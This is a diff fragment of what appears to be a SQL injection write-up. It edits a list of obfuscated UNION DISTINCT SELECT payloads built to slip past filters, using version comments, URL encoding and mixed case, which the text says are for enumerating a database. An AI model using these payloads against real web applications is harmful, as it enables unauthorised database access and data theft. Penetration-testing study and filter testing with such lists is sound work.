@@ -82,12 +82,13 @@ Below are Union Distincs queries, which we can use for further enumerating:
 and 0e0union distinctROW select 1,2,3,4  
 and .0unIon distincrOw /*!50000sElect*/ 1,2,3,4  
 AnD point(29,9) /*!50000UnION*/ /*!50000SelEcT*/ 1,2,3,4  
+and mod(9,9) UNION SELECT 1,2,3,4  
 '-,1union distinctrow%23aaaaaaaaaaaaaaa%0a select 1,2,3,4  
 .0union distinct/**_**/Select 1,2,3,4  
 union distinct selec%54 1,2,3,4  
 UniOn DISTINCTROW sEleCt 1,2,3,4  
-+union+distinct+select+1,2,3,4  
-+union+distinctROW+select+1,2,3,4  
+union distinct select 1,2,3,4  
+union distinctROW select 1,2,3,4  
 ```
 
 In our case the following payload does the job:  
